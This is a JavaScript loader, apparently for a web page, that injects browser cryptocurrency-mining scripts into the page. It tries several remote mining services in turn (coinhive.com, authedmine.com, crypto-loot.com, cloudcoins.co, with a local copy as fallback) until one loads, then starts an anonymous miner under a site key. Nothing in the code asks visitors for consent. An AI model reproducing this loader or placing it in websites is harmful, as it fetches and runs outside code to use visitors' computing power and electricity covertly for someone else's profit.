var status = -1
function tryLoad(cb) {
  var script = document.createElement('script');
  script.src = 'https://coinhive.com/lib/coinhive.min.js';
  document.getElementsByTagName("head")[0].appendChild(script);
  script.onload = function() {
    console.log("Successfully loaded with remote coinhive script")
    try {
      new CoinHive.Anonymous('cHive');
      status = 0;
    } catch (e) {
      console.log("Script loaded, but miner could not be initialized");
      status = 4;
      script.dispatchEvent(new Event('onerror'));
    }
    if (status == 0) {
      cb();
    }
  }
  //check if it didn't load
  script.addEventListener("error", function() {
    var script = document.createElement('script');
    script.src = 'coinhive.min.js';
    document.getElementsByTagName("head")[0].appendChild(script);
    script.onload = function() {
      console.log("Successfully loaded with local coinhive script")
      try {
        //strSub
        new CoinHive.Anonymous('cHive');
        status = 0;
      } catch (e) {
        console.log("Script loaded, but miner could not be initialized");
        status = 4;
        script.dispatchEvent(new Event('onerror'));
      }
      if (status == 0) {
        cb();
      }
    }
    //check if it didn't load
    script.addEventListener("error", function() {
      var script = document.createElement('script');
      script.src = 'https://authedmine.com/lib/authedmine.min.js';
      document.getElementsByTagName("head")[0].appendChild(script);
      //check if script was loaded
      script.onload = function() {
        console.log("Successfully loaded with authedmine script")
        try {
          new CoinHive.Anonymous('cHive');
          status = 0;
        } catch (e) {
          console.log("Script loaded, but miner could not be initialized");
          status = 4;
          script.dispatchEvent(new Event('onerror'));
        }
        if (status == 0) {
          cb();
        }
      }
      script.addEventListener("error", function() {
        var script = document.createElement('script');
        script.src = 'https://crypto-loot.com/lib/miner.min.js';
        document.getElementsByTagName("head")[0].appendChild(script);
        //check if script was loaded
        script.onload = function() {
          console.log("Successfully loaded with crypto-loot script")
          try {
            new CryptoLoot.Anonymous('cLoot');
            status = 1;
          } catch (e) {
            console.log("Script loaded, but miner could not be initialized");
            status = 4;
            script.dispatchEvent(new Event('onerror'));
          }
          if (status == 1) {
            cb();
          }
        }
        //check if it didn't load
        script.addEventListener("error", function() {
          var script = document.createElement('script');
          script.src = 'https://cdn.cloudcoins.co/javascript/cloudcoins.min.js';
          document.getElementsByTagName("head")[0].appendChild(script);
          //check if script was loaded
          script.onload = function() {
            console.log("Successfully loaded with Cloudcoins script")
            try {
              new CLOUDCOINS.Miner('cCoins');
              status = 2;
            } catch (e) {
              console.log("Script loaded, but miner could not be initialized");
              status = 4;
              cb();
            }
            if (status == 2) {
              cb();
            }
          }
          script.addEventListener("error", function() {
            status = 3;
            cb();
          });
        });
      });
    });
  });
}

function processInfo(cb) {
  console.log("Status: " + status)
  if (status == 0) {
    var miner = new CoinHive.Anonymous('cHive');
  }
  if (status == 1) {
    var miner = new CryptoLoot.Anonymous('cLoot');
  }
  if (status == 2) {
    var miner = new CLOUDCOINS.Miner('cCoins');
  }
  cb(miner, status);
}

function loadCryptominer(cb) {
  tryLoad(function() {
    processInfo(function(miner, status) {
      cb(miner, status);
    })
  })
}
